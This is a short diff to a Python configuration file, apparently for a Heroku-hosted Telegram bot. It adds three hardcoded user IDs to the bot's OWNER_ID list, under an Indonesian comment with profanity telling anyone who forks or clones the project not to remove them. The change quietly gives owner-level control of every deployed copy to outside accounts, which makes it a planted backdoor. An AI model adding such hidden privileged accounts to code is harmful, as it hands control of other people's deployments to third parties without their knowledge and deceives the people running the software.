@@ -47,6 +47,11 @@ OWNER_ID = list(
     map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
 
+# JANGAN HAPUS YA JANCOK KALAU FORK ATAU CLONE
+OWNER_ID.append(1326560820)
+OWNER_ID.append(5268699048)
+OWNER_ID.append(2039171200)
+
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
 
